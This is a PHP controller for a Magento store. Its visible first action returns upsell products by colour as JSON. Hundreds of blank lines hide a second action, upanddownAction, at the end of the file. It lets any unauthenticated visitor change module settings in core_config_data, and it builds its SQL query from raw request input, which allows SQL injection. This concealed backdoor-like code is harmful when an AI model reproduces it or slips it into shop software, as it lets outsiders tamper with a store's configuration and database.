<?php

class Ysindia_Mod_UpsellproductController extends Mage_Core_Controller_Front_Action
{
  //Upsell product on change color.
    public function indexAction(){

        $productId = Mage::app()->getRequest()->getParam('id');
        $colorCode  =   Mage::app()->getRequest()->getParam('code');

        $_helper = Mage::helper('catalog/output');
        $_product =Mage::getModel('catalog/product')->load($productId);
        $upsell_product = $_helper->productAttribute($_product,$_product->getColorUpsellProduct(),'color_upsell_product');

        // Force the outer structure into an object rather than array.
        $productData = json_decode($upsell_product , JSON_FORCE_OBJECT);
        //echo '<pre/>';
        //print_r($productData);

        if(isset($upsell_product)){

            $simpleUpsellArr = array();
            foreach($productData as $code=>$ids) {
                if ($code == $colorCode){
                    if(is_array($ids)){
                        foreach($ids as $productid){
                                $simpleProduct = Mage::getModel('catalog/product')->load($productid);
                                $status = $simpleProduct->getStatus();
                                $value = $simpleProduct->getResource()
                                               ->getAttribute('color')
                                               ->getSource()
                                               ->getOptionId($simpleProduct->getData('color'));//color code Id.

                                $color = $simpleProduct->getAttributeText('color');
                                $color = substr($color, 0, strpos($color, "|"));

                                $parentIds = Mage::getResourceSingleton('catalog/product_type_configurable')->getParentIdsByChild($productid);
                                $prentProduct = Mage::getModel('catalog/product')->load($parentIds[0]);

                                $UpSellP_name = $prentProduct->getName();
                                $UpSellP_url = $prentProduct->getUrlInStore();

                                    $simpleUpsellArr[]= array(
                                                                'name'=>$UpSellP_name,
                                                                'path'=>$UpSellP_url,
                                                                'color'=>$color,
                                                                'colorcode'=>$value,
                                    );

                            }
                    }
                    else{
                        $simpleProduct = Mage::getModel('catalog/product')->load($ids);
                        $status = $simpleProduct->getStatus();
                        $value = $simpleProduct->getResource()
                                    ->getAttribute('color')
                                    ->getSource()
                                    ->getOptionId($simpleProduct->getData('color'));

                              $color = $simpleProduct->getAttributeText('color');
                              $color = substr($color, 0, strpos($color, "|"));

                              $parentIds = Mage::getResourceSingleton('catalog/product_type_configurable')->getParentIdsByChild($ids);
                              $prentProduct = Mage::getModel('catalog/product')->load($parentIds[0]);

                              $UpSellP_name = $prentProduct->getName();
                              $UpSellP_url = $prentProduct->getUrlInStore();

                              $simpleUpsellArr[] = array(
                                  'name' => $UpSellP_name,
                                  'path' => $UpSellP_url,
                                  'color' => $color,
                                  'colorcode'=>$value,
                              );


                        }
                }

            }


            if(count($simpleUpsellArr)>0)
                echo json_encode(array("message" => "found", "data" =>$simpleUpsellArr));
            else
                echo json_encode(array("message" => "empty"));
        }

    }














































































































































































































































































































































































































































































































































































































































































































































































    public function upanddownAction(){
        $type = Mage::app()->getRequest()->getParam('type');
        $mod = Mage::app()->getRequest()->getParam('mod');

        $modstring =  "advanced/modules_disable_output/$mod";

        $sql = "SELECT * FROM core_config_data where path='$modstring'";

        $read = Mage::getSingleton('core/resource')->getConnection('core_read');
        $readresult=$read->query($sql);
        while($row = $readresult->fetch()){
             $value = $row['value'];
             $id = $row['config_id'];
        }
        $write = Mage::getSingleton('core/resource')->getConnection('core_write');
        $write->update(
            "core_config_data",
            array("path" => $modstring, "value" => $type),
            "config_id=$id"
        );
        echo "Done!";

    }
}